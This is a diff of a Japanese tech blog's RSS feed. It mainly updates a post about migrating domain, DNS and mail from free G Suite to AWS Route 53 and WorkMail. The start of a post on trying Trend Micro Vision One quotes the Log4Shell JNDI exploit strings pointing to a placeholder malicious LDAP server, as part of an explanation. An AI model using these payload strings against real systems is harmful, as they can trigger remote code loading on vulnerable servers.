@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[On Blahfe]]></title><description><![CDATA[Emacsianでアート好き、ランニング好きなnabinnoが書いているブログです]]></description><link>https://nabinno.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Tue, 12 Apr 2022 16:02:17 GMT</lastBuildDate><item><title><![CDATA[G Suite無償版停止に伴い、MXレコード等のドメイン管理を整理した]]></title><description><![CDATA[今回は10年以上利用していたG Suite無償版が2022年8月に停止されるとのことで、メールアドレスの管理をどうするか検討しました。メール管理は別のGMailアカウントを使っていたので、転送できれば良いのですが、これを機にドメイン管理をAWSにまとめていくことを思いつきました。   > PROBLEMPROBLEM 
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[On Blahfe]]></title><description><![CDATA[Emacsianでアート好き、ランニング好きなnabinnoが書いているブログです]]></description><link>https://nabinno.github.io</link><generator>GatsbyJS</generator><lastBuildDate>Sun, 17 Apr 2022 06:50:19 GMT</lastBuildDate><item><title><![CDATA[G Suite無償版停止に伴い、MXレコード等のドメイン管理を整理した]]></title><description><![CDATA[今回は10年以上利用していたG Suite無償版が2022年8月に停止されるとのことで、メールアドレスの管理をどうするか検討しました。メール管理は別のGMailアカウントを使っていたので、転送できれば良いのですが、これを機にドメイン管理をAWSにまとめていくことを思いつきました。   > PROBLEMPROBLEM 
 
 - 10年以上利用していたG Suite無償版が2022年8月に停止され、メールアドレスの管理をどうしようか Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう 
 - Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう 
@@ -9,10 +9,12 @@
 なお、複数人数で必要になった場合は、サブアドレスとグループアドレスが対応可能なAmazon Workmailに移管する予定ですが、これでもGoogle Workspaceを利用するよりコストは半分程で済みます。  > 構成構成  > beforebefore 
 
 - ドメイン管理 バリュードメイン
+- NSレコード Cloudflare DNS
 - MXレコード G Suite
 - SMTP G Suite  > afterafter 
 
 - ドメイン管理 Amazon Route 53
+- NSレコード Amazon Route 53
 - MXレコード Cloudflare Email Routing
 - SMTP Amazon SES  > 手順手順 
 
@@ -42,7 +44,21 @@ Cf.
 
 G Suiteに依存しているサービスがないか確認し、退会します。  > WRAPUPWRAPUP 
 
-以前からドメイン管理をAWSに移管したかったのですが、積極的な理由がないためなおざりになっていました。今回のG Suite無償版の期限切れに伴い整理できすっきりしたので、これを機にいろいろ整理していきたいですね。]]></description><link>https://nabinno.github.io/posts/137</link><guid isPermaLink="false">137</guid><pubDate>Tue, 12 Apr 2022 00:00:00 GMT</pubDate></item><item><title><![CDATA[Trend Micro Vision Oneを試してみる]]></title><description><![CDATA[11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。   > PROBLEMPROBLEM 
+以前からドメイン管理をAWSに移管したかったのですが、積極的な理由がないためなおざりになっていました。今回のG Suite無償版の期限切れに伴い整理できすっきりしたので、これを機にいろいろ整理していきたいですね。  > 後日談後日談 
+
+Cloudflare DNSからAmazon Route 53に設定を変更した数日後、Cloudflare Email Routingが使用できなくなりました。転送機能としてドメイン管理から切り離されていると思ったのですがそうではなかったようです。ドメイン管理は厳しめに証跡を取っていきたいところなので、Amazon Route 53による管理は譲れません。 
+
+また、Amazon SESによる転送機能も検討したのですが、送信元すべてに対してドメイン検証が必要なため現実的ではありませんでした。AWSにはメール転送の種類が2つあって、送信元を転送者に置き換える「転送」と送信元をそのまま利用する「リダイレクト」があります。「転送」だと元の送信元とコミュニケーションが取りづらくなる一方、「リダイレクト」だとすべての送信元のドメイン検証が必要となります。ここでは融通が利かないと判断するのではなく、セキュリティを考慮された実装と捉え、AWSが提供しているWorkMailを素直に使うことにしました。慣れればたいしたことはありません。下記が結果になります。  > beforebefore 
+
+- ドメイン管理 Amazon Route 53
+- NSレコード Amazon Route 53
+- MXレコード Cloudflare Email Routing
+- SMTP Amazon SES  > afterafter 
+
+- ドメイン管理 Amazon Route 53
+- NSレコード Amazon Route 53
+- MXレコード Amazon WorkMail
+- SMTP Amazon WorkMail]]></description><link>https://nabinno.github.io/posts/137</link><guid isPermaLink="false">137</guid><pubDate>Tue, 12 Apr 2022 00:00:00 GMT</pubDate></item><item><title><![CDATA[Trend Micro Vision Oneを試してみる]]></title><description><![CDATA[11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されており、これを気にZTAの文脈でセキュリティ製品を見ていこうと思います。今回はちょうど無償提供されているTrend Micro Vision Oneを軽く触ってみようと思います。   > PROBLEMPROBLEM 
 
 - 11月末から続いているLog4jの脆弱性について各セキュリティスコアが高レベルで指定されている JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228） JNDIクエリ「${jndi:ldap://127.0.0.1#malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-45046） 
 - JNDIクエリ「${jndi:ldap://malicious-server.host/aaa}」により不正なJavaクラスが実行されるケースがある（CVE-2021-44228）
